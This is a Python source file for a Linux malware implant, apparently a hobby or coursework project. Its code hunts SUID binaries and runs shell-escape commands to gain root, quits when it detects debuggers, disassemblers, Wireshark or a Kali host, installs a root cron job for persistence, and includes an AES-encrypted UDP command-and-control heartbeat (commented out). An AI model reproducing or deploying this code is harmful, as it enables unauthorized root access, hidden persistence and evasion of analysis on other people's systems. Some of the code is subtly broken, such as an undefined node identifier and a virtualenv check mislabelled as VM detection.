import socket
import base64
import sys
from os import system, popen
import psutil
import threading
import subprocess
from subprocess import DEVNULL, STDOUT, check_call
import time
from crontab import CronTab
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

AntiDebug = False

GotExploits = {
    'ash':      '',
    'bash':     '-p',
    'sh':       '-p',
    'dash':     '-p',
    'zsh':      '',
    'busybox':  'sh',
    'docker':   'run -v /:/mnt --rm -it alpine chroot /mnt sh',
    'find':     '. -exec /bin/sh -p \\; -quit',
    'perl':     '-e \'exec "/bin/sh";\'',
    'php':      '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    'python':   '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    'vim':      '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
}

default_binaries = [ 'unopk', 'pux', 'JSONStr', 'chrome-sandbox', 'pppd', 'ssh-keysign', \
'dbus-daemon-launch-helper', \
'Xorg.wrap', 'spice-client-glib-usb-acl-helper', 'dmcrypt-get-device', 'polkit-agent-helper-1', \
'snap-confine', 'fusermount', 'umount', 'su', 'sudo', 'pkexec', 'passwd', 'chsh', 'chfn', 'newgrp',\
'mount', 'gpasswd', 'mount', 'ping', 'su', 'umount', 'chfn', 'chsh', 'gpasswd', 'newgrp', 'passwd',\
'sudo', 'dbus-daemon-launch-helper', 'ssh-keysign', 'snap-confine', 'snap-confine', 'chfn', 'chsh',\
'gpasswd', 'mount', 'newgrp', 'passwd', 'su', 'sudo', 'umount', 'dbus-daemon-launch-helper', \
'ssh-keysign', 'chfn', 'chsh', 'gpasswd', 'mount', 'newgrp', 'passwd', 'su', 'sudo', 'umount', \
'dbus-daemon-launch-helper', 'ssh-keysign', 'arping', 'at', 'bwrap']


def build_message(message, key):
    message_encoded = base64.b64encode(message)
    pre_aes = str(node_id) + "_" + message_encoded.decode()
    plaintext = pre_aes.encode()
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    nonce_encoded = base64.b64encode(nonce).decode()
    ciphertext_encoded = base64.b64encode(ciphertext).decode()
    final_output = nonce_encoded + "_" + ciphertext_encoded
    return final_output.encode()


def deconstruct_message(message, key):
    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
    nonce = base64.b64decode(nonce_encoded)
    ciphertext = base64.b64decode(ciphertext_encoded)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode()

def get_suid_bins():
    cmd = ['find', '/', '-perm', '-4000', '-type', 'f']
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=DEVNULL)

    return res.stdout.decode('unicode_escape').strip().split('\n')

def filter_default(suid_bins):
    custom = []
    for b in suid_bins:
        name = b.split("/")[::-1][0]

        if name not in default_binaries:
            custom.append(b)

    return custom

def exploit_suids(suids):
    exploits = []

    for s in suids:
        name = s.split("/")[::-1][0]

        if name in GotExploits:
            exploit = s + " " + GotExploits[name]
            exploits.append(exploit)

    for exploit in exploits:
        system(exploit)

def privesc():
    suid_bins = get_suid_bins()
    custom_suids = filter_default(suid_bins)
    exploit_suids(custom_suids)

def antidebug():
    global AntiDebug
    black_list_programs = ["binaryninja", "ida", "ghidrarun", "ghidra", "wireshark", "gdb", \
    "valgrind", "objdump", "strings"]

    # Check if we are running in virtual machine, if so, exit
    if (hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') 
        and sys.base_prefix != sys.prefix)):
        quit()

    # Check if we are running on kali
    output = subprocess.check_output("lsb_release -a", shell=True, stderr=DEVNULL)
    if bytes("Kali", encoding='utf8') in output:
        quit()

    AntiDebug = True

    # Check if blacklisted program is running, and if so, exit
    while True:
        time.sleep(1)

        for program in black_list_programs:
            for proc in psutil.process_iter():
                if program in proc.name() or program in proc.name().lower():
                    quit()

def setup_persistence():
    cron = CronTab(user='root')
    job = cron.new(command='/opt/malware.bin')
    job.minute.every(60)
    cron.write()

# For testing, the main program will print out the symmetric key in the beginning, 
# paste it below before running
def main():
    global AntiDebug

    if len(sys.argv) != 2:
        print("USAGE: python3 "+sys.argv[0]+" ENCRYPTION_KEY")
        sys.exit(1)

    # TODO check if malware is already running, if so quit

    # Setup encryption key
    #key = bytes.fromhex(sys.argv[1])
    #heartbeat_message = b"heartbeat"
    #node_id = 69420

    # Start thread to handle anti-debug in the background
    th = threading.Thread(target=antidebug)
    th.start()

    # Make sure anti-debug successfuly completed before continuing execution
    while not AntiDebug:
        pass

    # Privilege escalate to root user
    privesc()

    # Launch cron job that maintains persistence after reboot
    #setup_persistence()

    print("starting malware")

    """
    IP = "127.0.0.1"
    PORT = 53045

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.sendto(build_message(heartbeat_message, key), (IP, PORT))
    recv = client_socket.recvfrom(4096)
    print(recv)
    plaintext = deconstruct_message(recv[0], key)
    print(plaintext)
    if plaintext.strip() == 'uninstall':
        client_socket.sendto(build_message(b"uninstall ack", key), (IP, PORT))
    client_socket.close()
    """

    th.join()

if __name__ == "__main__":
    main()

